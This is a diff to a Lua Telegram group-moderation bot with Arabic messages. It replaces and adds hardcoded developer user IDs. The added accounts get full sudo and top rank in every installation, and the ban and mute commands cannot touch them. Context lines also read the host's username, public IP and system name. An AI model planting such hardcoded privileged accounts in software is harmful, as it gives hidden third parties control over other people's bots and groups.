@@ -8,7 +8,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,1425830897}
+List_Sudos = {Id_Sudo,651284991,480408025,1425830897}
 User = io.popen("whoami"):read('*a')
 IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
 name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
@@ -147,9 +147,11 @@ end
 return var
 end 
 function Rank_Checking(user_id,chat_id)
-if tonumber(user_id) == tonumber(1425830897) then  
+if tonumber(user_id) == tonumber(651284991) then  
 var = true  
-elseif tonumber(user_id) == tonumber(1749690187) then
+elseif tonumber(user_id) == tonumber(1425830897) then
+var = true  
+elseif tonumber(user_id) == tonumber(480408025) then
 var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
@@ -177,9 +179,11 @@ end
 return var
 end 
 function Get_Rank(user_id,chat_id)
-if tonumber(user_id) == tonumber(1425830897) then  
+if tonumber(user_id) == tonumber(651284991) then  
+var = "مطور السورس"  
+elseif tonumber(user_id) == tonumber(1425830897) then  
 var = 'مبــرمج السـورس'
-elseif tonumber(user_id) == tonumber(1749690187) then  
+elseif tonumber(user_id) == tonumber(651284991) then  
 var = "مطور السورس"  
 elseif DevsaKene(user_id) == true then
 var = "المطور الاساسي"  
@@ -4011,7 +4015,7 @@ send(msg.chat_id_, msg.id_,'*⋄︙لقد تم تعطيل الحظر و الطر
 return false
 end
 function Function_saKen(extra, result, success)
-if result.sender_user_id_ == tonumber(1425830897) then
+if result.sender_user_id_ == tonumber(651284991) then
 send(msg.chat_id_, msg.id_, "*⋄︙لا يمكن { حظر } Telegram Developer \n*")
 return false
 end
@@ -4066,7 +4070,7 @@ return false
 end
 function Function_saKen(extra, result, success)
 if result.id_ then
-if result.id_ == tonumber(1425830897) then
+if result.id_ == tonumber(651284991) then
 send(msg.chat_id_, msg.id_, "*⋄︙لا يمكن حظر مطور السورس* \n")
 return false
 end
@@ -4112,7 +4116,7 @@ if userid == tonumber(Id_Sudo) then
 send(msg.chat_id_, msg.id_, "*⋄︙لا يمكن حظر مطور البوت* \n")
 return false
 end
-if userid == tonumber(1425830897) then
+if userid == tonumber(651284991) then
 send(msg.chat_id_, msg.id_, "*⋄︙لا يمكن { حظر } Telegram Developer \n*")
 return false
 end
@@ -4179,7 +4183,7 @@ return false
 end
 if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) and GetChannelMember(msg) then
 function Function_saKen(extra, result, success)
-if result.sender_user_id_ == tonumber(1425830897) then
+if result.sender_user_id_ == tonumber(651284991) then
 send(msg.chat_id_, msg.id_, "*⋄︙لا يمكن كتم Telegram Developer* \n")
 return false
 end
@@ -4205,7 +4209,7 @@ return false
 end
 function Function_saKen(extra, result, success)
 if result.id_ then
-if result.id_ == tonumber(1425830897) then
+if result.id_ == tonumber(651284991) then
 send(msg.chat_id_, msg.id_, "*⋄︙لا يمكن كتم Telegram Developer* \n")
 return false
 end
@@ -4228,7 +4232,7 @@ return false
 end
 if text and text:match("^كتم (%d+)$") and Addictive(msg) and GetChannelMember(msg) then
 local userid = text:match("^كتم (%d+)$")
-if userid == tonumber(1425830897) then
+if userid == tonumber(651284991) then
 send(msg.chat_id_, msg.id_, "*⋄︙لا يمكن كتم Telegram Developer* \n")
 return false
 end
